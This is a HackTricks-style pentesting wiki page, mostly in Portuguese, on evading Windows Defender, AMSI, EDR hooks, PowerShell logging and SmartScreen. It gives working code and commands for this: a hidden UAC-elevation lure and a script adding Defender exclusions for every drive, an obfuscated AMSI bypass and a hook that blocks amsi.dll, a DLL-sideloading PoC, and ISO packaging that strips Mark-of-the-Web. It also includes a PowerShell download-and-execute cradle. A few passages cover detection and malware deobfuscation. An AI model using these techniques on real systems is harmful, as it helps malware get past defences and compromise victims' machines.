# Bypass de Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página foi inicialmente escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para parar o Windows Defender de funcionar.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para parar o Windows Defender de funcionar fingindo ser outro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Isca em estilo instalador para UAC antes de mexer no Defender

Public loaders mascarando-se como game cheats frequentemente são distribuídos como instaladores Node.js/Nexe não assinados que primeiro **pedem ao usuário elevação** e só então neutralizam o Defender. O fluxo é simples:

1. Verifica o contexto administrativo com `net session`. O comando só tem sucesso quando o chamador possui privilégios de administrador, então uma falha indica que o loader está sendo executado como usuário padrão.
2. Relança-se imediatamente com o verbo `RunAs` para disparar o esperado prompt de consentimento do UAC enquanto preserva a linha de comando original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
As vítimas já acreditam que estão instalando software “cracked”, então o prompt geralmente é aceito, dando ao malware os privilégios necessários para alterar a política do Defender.

### Exclusões abrangentes de `MpPreference` para cada letra de unidade

Uma vez elevado, GachiLoader-style chains maximizam os pontos cegos do Defender em vez de desativar o serviço por completo. O loader primeiro mata o GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) e então aplica **exclusões extremamente amplas** para que todo perfil de usuário, diretório do sistema e disco removível se tornem não verificáveis:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Principais observações:

- O loop varre todos os sistemas de arquivos montados (D:\, E:\, pendrives USB, etc.), então **qualquer payload futuro colocado em qualquer lugar do disco é ignorado**.
- A exclusão por extensão `.sys` é prospectiva—atacantes reservam a opção de carregar drivers não assinados mais tarde sem tocar no Defender novamente.
- Todas as alterações são gravadas em `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitindo que estágios posteriores confirmem que as exclusões persistem ou as expandam sem reativar o UAC.

Como nenhum serviço do Defender é parado, checagens ingênuas de integridade continuam reportando “antivírus ativo” mesmo que a inspeção em tempo real nunca toque nesses caminhos.

## **AV Evasion Methodology**

Atualmente, os AVs usam diferentes métodos para checar se um arquivo é malicioso ou não: detecção estática, análise dinâmica e, para os EDRs mais avançados, análise comportamental.

### **Static detection**

A detecção estática é feita sinalizando strings conhecidas maliciosas ou arrays de bytes em um binário ou script, além de extrair informações do próprio arquivo (por exemplo: descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isso significa que usar ferramentas públicas conhecidas pode fazer você ser detectado mais facilmente, pois provavelmente já foram analisadas e marcadas como maliciosas. Há algumas maneiras de contornar esse tipo de detecção:

- **Encryption**

Se você criptografar o binário, não haverá como o AV detectar seu programa, mas será necessário algum tipo de loader para descriptografar e executar o programa em memória.

- **Obfuscation**

Às vezes tudo que você precisa fazer é mudar algumas strings no seu binário ou script para passar pelo AV, mas isso pode ser uma tarefa demorada dependendo do que você está tentando ofuscar.

- **Custom tooling**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas conhecidas como maliciosas, mas isso demanda muito tempo e esforço.

> [!TIP]
> Uma boa forma de checar a detecção estática do Windows Defender é o [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele basicamente divide o arquivo em múltiplos segmentos e então solicita que o Defender escaneie cada um individualmente; dessa forma, pode dizer exatamente quais são as strings ou bytes sinalizados no seu binário.

Recomendo fortemente que veja esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre AV Evasion prático.

### **Dynamic analysis**

A análise dinâmica ocorre quando o AV executa seu binário em uma sandbox e observa atividades maliciosas (por exemplo: tentar descriptografar e ler as senhas do navegador, realizar um minidump no LSASS, etc.). Essa parte pode ser um pouco mais complicada de lidar, mas aqui estão algumas coisas que você pode fazer para evadir sandboxes.

- **Sleep before execution** Dependendo de como é implementado, pode ser uma ótima forma de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo do usuário, então usar sleeps longos pode prejudicar a análise de binários. O problema é que muitas sandboxes de AV podem simplesmente pular o sleep dependendo da implementação.
- **Checking machine's resources** Geralmente sandboxes têm poucos recursos disponíveis (por exemplo: < 2GB RAM), caso contrário poderiam deixar a máquina do usuário lenta. Você também pode ser muito criativo aqui, por exemplo verificando a temperatura da CPU ou até as velocidades das ventoinhas; nem tudo será implementado na sandbox.
- **Machine-specific checks** Se você quer atingir um usuário cuja estação está ingressada no domínio "contoso.local", você pode fazer uma checagem do domínio do computador para ver se bate com o que você especificou; se não bater, seu programa pode encerrar.

Acontece que o nome do computador da Sandbox do Microsoft Defender é HAL9TH, então você pode checar o nome do computador no seu malware antes da detonação; se o nome corresponder a HAL9TH, significa que você está dentro da sandbox do Defender, então pode fazer seu programa encerrar.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Outras boas dicas do [@mgeeky](https://twitter.com/mariuszbit) para enfrentar Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como dissemos antes neste post, **ferramentas públicas** eventualmente **serão detectadas**, então você deve se perguntar algo:

Por exemplo, se você quer dumpar o LSASS, **você realmente precisa usar o mimikatz**? Ou poderia usar um projeto diferente, menos conhecido, que também dumpe o LSASS?

A resposta certa provavelmente é a última. Tomando o mimikatz como exemplo, ele provavelmente é um dos, senão o mais sinalizado piece of malware por AVs e EDRs; embora o projeto em si seja muito bom, também é um pesadelo usá-lo para contornar AVs, então procure alternativas para o que você está tentando alcançar.

> [!TIP]
> Ao modificar seus payloads para evadir, certifique-se de **desligar o envio automático de amostras** no Defender e, por favor, seriamente, **NÃO FAÇA UPLOAD NO VIRUSTOTAL** se seu objetivo é alcançar evasão a longo prazo. Se você quer checar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desligar o envio automático de amostras e teste lá até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, priorize **usar DLLs para evasão**; na minha experiência, arquivos DLL geralmente são **bem menos detectados** e analisados, então é um truque simples para evitar detecção em alguns casos (se seu payload tiver alguma forma de rodar como uma DLL, claro).

Como podemos ver nesta imagem, um DLL Payload do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem taxa de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Agora mostraremos alguns truques que você pode usar com arquivos DLL para ser muito mais furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** explora a ordem de busca de DLLs usada pelo loader, posicionando tanto o aplicativo vítima quanto os payload(s) maliciosos lado a lado.

Você pode checar por programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte script PowerShell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando exibirá a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Recomendo fortemente que você **explore DLL Hijackable/Sideloadable programs yourself**, esta técnica é bastante furtiva quando feita corretamente, mas se você usar programas Sideloadable publicamente conhecidos, pode ser facilmente pego.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não fará seu payload ser executado, pois o programa espera funções específicas dentro dessa DLL. Para resolver isso, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (maliciosa) para a DLL original, preservando a funcionalidade do programa e possibilitando a execução do seu payload.

Vou usar o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um template de código-fonte de DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto o proxy DLL têm uma taxa de detecção de 0/26 no [antiscan.me](https://antiscan.me)! Eu consideraria isso um sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Recomendo **fortemente** que você assista [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais profundamente sobre o que discutimos.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

Isso habilita uma primitive de sideloading indireta: encontre uma signed DLL que exporta uma função encaminhada para um nome de módulo que não é KnownDLL, então coloque essa signed DLL no mesmo diretório de uma DLL controlada pelo atacante com o nome exatamente igual ao módulo destino encaminhado. Quando o forwarded export é invocado, o loader resolve o forward e carrega sua DLL a partir do mesmo diretório, executando seu DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` não é um KnownDLL, então ele é resolvido pela ordem normal de pesquisa.

PoC (copiar e colar):
1) Copie a DLL de sistema assinada para uma pasta gravável
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque um `NCRYPTPROV.dll` malicioso na mesma pasta. Um DllMain mínimo é suficiente para obter execução de código; você não precisa implementar a função encaminhada para acionar o DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Acione o encaminhamento com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento observado:
- rundll32 (signed) carrega o side-by-side `keyiso.dll` (signed)
- Ao resolver `KeyIsoSetAuditingInterface`, o loader segue o forward para `NCRYPTPROV.SetAuditingInterface`
- Em seguida o loader carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementada, você só receberá um erro "missing API" depois que `DllMain` já tiver sido executado

Dicas de hunting:
- Foque em forwarded exports onde o módulo de destino não é um KnownDLL. KnownDLLs estão listados em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar forwarded exports com ferramentas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Veja o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
- Alert on process/module chains like: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- Enforce code integrity policies (WDAC/AppLocker) and deny write+execute in application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze é um payload toolkit para contornar EDRs usando processos suspensos, direct syscalls, e métodos alternativos de execução`

Você pode usar o Freeze para carregar e executar seu shellcode de maneira furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasão é apenas um jogo de gato e rato; o que funciona hoje pode ser detectado amanhã, então nunca confie em apenas uma ferramenta — se possível, tente encadear múltiplas técnicas de evasão.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs frequentemente colocam **user-mode inline hooks** nos stubs de syscall de `ntdll.dll`. Para contornar esses hooks, você pode gerar stubs de syscall **direct** ou **indirect** que carregam o SSN correto (Número de Serviço do Sistema) e fazem a transição para o modo kernel sem executar o entrypoint exportado hookeado.

**Invocation options:**
- **Direct (embedded)**: emite uma instrução `syscall`/`sysenter`/`SVC #0` no stub gerado (sem acionar o export de `ntdll`).
- **Indirect**: salta para um gadget `syscall` existente dentro de `ntdll` para que a transição ao kernel aparente originar-se de `ntdll` (útil para evasão heurística); **randomized indirect** escolhe um gadget de um pool por chamada.
- **Egg-hunt**: evita embutir a sequência de opcode estática `0F 05` no disco; resolve uma sequência de syscall em tempo de execução.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: infere SSNs ordenando os stubs de syscall por endereço virtual em vez de ler os bytes do stub.
- **SyscallsFromDisk**: mapeia um `\KnownDlls\ntdll.dll` limpo, lê SSNs do seu `.text`, e depois desfaz o mapeamento (contorna todos os hooks em memória).
- **RecycledGate**: combina inferência de SSN ordenada por VA com validação de opcode quando um stub está limpo; recua para inferência por VA se estiver hookeado.
- **HW Breakpoint**: seta DR0 na instrução `syscall` e usa um VEH para capturar o SSN de `EAX` em tempo de execução, sem analisar os bytes hookeados.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI foi criado para prevenir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, AVs só eram capazes de escanear **files on disk**, então se você conseguisse executar payloads **directly in-memory**, o AV não poderia fazer nada para impedir, pois não tinha visibilidade suficiente.

A funcionalidade AMSI está integrada nestes componentes do Windows.

- User Account Control, or UAC (elevamento de EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, uso interativo, e avaliação dinâmica de código)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ela permite que soluções antivirus inspecionem o comportamento de scripts expondo o conteúdo dos scripts de forma não criptografada e sem obfuscação.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produzirá o seguinte alerta no Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Repare como ele antepõe `amsi:` e em seguida o caminho para o executável de onde o script foi executado, neste caso, powershell.exe

Não deixamos nenhum arquivo no disco, mas ainda assim fomos detectados in-memory por causa do AMSI.

Além disso, a partir do **.NET 4.8**, código C# também é executado através do AMSI. Isso afeta até `Assembly.Load(byte[])` para carregamento e execução in-memory. Por isso é recomendado usar versões mais baixas do .NET (como 4.7.2 ou inferiores) para execução in-memory se você quiser evitar o AMSI.

Existem algumas maneiras de contornar o AMSI:

- **Obfuscation**

Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa maneira de evadir a detecção.

Entretanto, o AMSI tem a capacidade de desobfuscar scripts mesmo que tenham múltiplas camadas, então obfuscação pode ser uma má opção dependendo de como for feita. Isso torna a evasão não tão direta. Embora, às vezes, tudo o que você precise fazer seja trocar alguns nomes de variáveis e estará tudo bem, então depende de quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também cscript.exe, wscript.exe, etc.), é possível manipular isso facilmente mesmo executando como um usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram múltiplas formas de evadir a varredura do AMSI.

**Forcing an Error**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) resultará em nenhuma varredura sendo iniciada para o processo atual. Originalmente isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para prevenir uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bastou uma linha de código powershell para tornar o AMSI inutilizável para o processo powershell atual. Essa linha, obviamente, foi sinalizada pelo próprio AMSI, então é necessário modificá-la para poder usar esta técnica.

Aqui está um AMSI bypass modificado que peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tenha em mente que isso provavelmente será sinalizado assim que esta publicação for divulgada, então você não deve publicar qualquer código se seu plano é permanecer indetectado.

**Memory Patching**

Esta técnica foi inicialmente descoberta por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê‑la com instruções para retornar o código E_INVALIDARG; dessa forma, o resultado da verificação real retornará 0, que é interpretado como um resultado limpo.

> [!TIP]
> Por favor, leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.

Existem também muitas outras técnicas usadas para contornar AMSI com powershell — confira [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

### Bloqueando AMSI impedindo o carregamento de amsi.dll (LdrLoadDll hook)

AMSI é inicializado somente depois que `amsi.dll` é carregado no processo atual. Um bypass robusto e agnóstico à linguagem é colocar um user‑mode hook em `ntdll!LdrLoadDll` que retorna um erro quando o módulo solicitado é `amsi.dll`. Como resultado, o AMSI nunca carrega e nenhuma verificação ocorre para esse processo.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona em PowerShell, WScript/CScript e custom loaders igualmente (qualquer coisa que de outra forma carregaria AMSI).
- Combine com envio de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefatos longos na linha de comando.
- Visto sendo usado por loaders executados através de LOLBins (e.g., `regsvr32` chamando `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remover a assinatura detectada**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura AMSI detectada da memória do processo atual. Esta ferramenta funciona escaneando a memória do processo atual em busca da assinatura do AMSI e então sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use PowerShell versão 2**
Se você usar PowerShell versão 2, AMSI não será carregado, então você pode executar seus scripts sem serem verificados pelo AMSI. Você pode fazer isso:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging é um recurso que permite registrar todos os comandos PowerShell executados em um sistema. Isso pode ser útil para auditoria e solução de problemas, mas também pode ser um **problema para atacantes que querem evadir a detecção**.

Para contornar o PowerShell logging, você pode usar as seguintes técnicas:

- **Disable PowerShell Transcription and Module Logging**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse fim.
- **Use Powershell version 2**: Se você usar PowerShell version 2, o AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isso: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para spawnar um powershell sem defesas (é isso que `powerpick` do Cobal Strike usa).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes.  The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`).  This also patches the PE checksum so any modification will crash the binary.  Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation.  Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload.  Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork open-source da suíte de compilação [LLVM](http://www.llvm.org/) capaz de aumentar a segurança do software através da ofuscação de código e proteção contra adulteração.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, código ofuscado sem usar qualquer ferramenta externa e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações ofuscadas geradas pelo framework de metaprogramação de templates do C++ que tornará a vida de quem tenta quebrar a aplicação um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador binário x64 capaz de ofuscar diversos arquivos PE diferentes, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um motor simples de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código de granularidade fina para linguagens suportadas por LLVM que utiliza ROP (return-oriented programming). ROPfuscator ofusca um programa no nível do código assembly ao transformar instruções regulares em cadeias ROP, contrariando nossa concepção natural de fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um .NET PE Crypter escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

## SmartScreen & MoTW

Você pode ter visto esta tela ao baixar alguns executáveis da internet e executá-los.

Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicações potencialmente maliciosas.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicações pouco baixadas acionarão o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em Mais informações -> Executar assim mesmo).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) com o nome Zone.Identifier que é criado automaticamente ao baixar arquivos da internet, junto com a URL de onde foi baixado.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier para um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante notar que executáveis assinados com um certificado de assinatura **confiável** **não acionarão o SmartScreen**.

Uma maneira muito eficaz de evitar que seus payloads recebam o Mark of The Web é empacotá-los dentro de algum tipo de container, como um ISO. Isso acontece porque o Mark-of-the-Web (MOTW) **não** pode ser aplicado a volumes que não sejam NTFS.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em containers de saída para evadir o Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
